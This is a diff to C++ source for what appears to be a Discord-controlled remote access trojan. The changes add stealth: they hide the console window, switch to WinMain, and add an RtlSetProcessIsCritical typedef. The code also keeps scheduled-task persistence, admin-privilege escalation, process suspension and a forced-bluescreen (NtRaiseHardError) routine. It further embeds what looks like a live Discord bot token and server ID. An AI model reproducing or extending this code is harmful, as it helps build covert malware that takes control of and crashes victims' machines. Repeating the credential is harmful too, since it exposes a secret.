@@ -9,14 +9,18 @@
 #include <stdlib.h>
 #include <tlhelp32.h>
 #include <winternl.h>
+#include <processthreadsapi.h>
+#include <winhttp.h>
 
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical)(BOOLEAN NewValue, BOOLEAN* OldValue, BOOLEAN NeedScb);
+
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
 
 
-using namespace dpp;
+
 
 // Declare temp directory temp = C://...../temp
 std::filesystem::path temp = std::filesystem::temp_directory_path();
@@ -24,7 +28,7 @@ std::filesystem::path temp = std::filesystem::temp_directory_path();
 //shit to change
 const long long int guildId = 1254187382140305408;
 const std::string BOT_TOKEN = "MTI1NDE4NzU1OTQyNTQwOTEwNQ.Gm132A.xjuAMEV_NTmhvMymh5hr5ijKZ5R1kOwGixyH7I";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
-const bool autostart = true;
+const bool autostart = false;
 
 // creates channel at startup and defines functions
 void suspend(const std::string& processName);
@@ -32,8 +36,9 @@ void Startup();
 void getAdmin(HANDLE &hMutex);
 long long int Channelid_CreateChannel;
 void CreateChannel(dpp::cluster& bot, long long int &channellocationid);
+using namespace dpp;
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     HANDLE hMutex = CreateMutexA(NULL, TRUE, "Local\\BCFE3153-59B6-46B0-BA99-C17A9AD2E8D1");
     if (hMutex == NULL) {
         std::cout << "fail: " << GetLastError() << "\n";
@@ -45,6 +50,9 @@ int main() {
         CloseHandle(hMutex);
         return 0;
     }
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
+
 
     cluster bot(BOT_TOKEN, i_default_intents | i_message_content);
     bot.on_log(utility::cout_logger());
@@ -207,7 +215,7 @@ int main() {
         }
         else
         {
-            std::cout << "not for me";
+            std::cout << "not for me\n";
         }
         });
 
